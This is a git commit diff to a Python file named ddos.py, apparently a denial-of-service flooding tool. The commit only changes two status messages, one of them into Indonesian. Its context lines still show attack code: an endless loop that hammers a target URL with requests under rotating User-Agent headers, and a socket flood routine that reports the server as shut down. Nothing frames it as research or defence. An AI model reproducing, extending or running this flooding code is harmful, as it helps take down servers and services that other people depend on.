0df906a1c3bbc7788889a3af00fdafe414f58c02
NAZRIL <52010048+Nursy4h@users.noreply.github.com>
2020-07-08 09:15:04 +0700

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mbot is hammering...\033[0m")
+			print("\033[94mbot is ddos...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -55,7 +55,7 @@ def down_it(item):
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mno connection! server maybe down\033[0m")
+		print("\033[91mtidak terbaca! server mungkin hancur\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
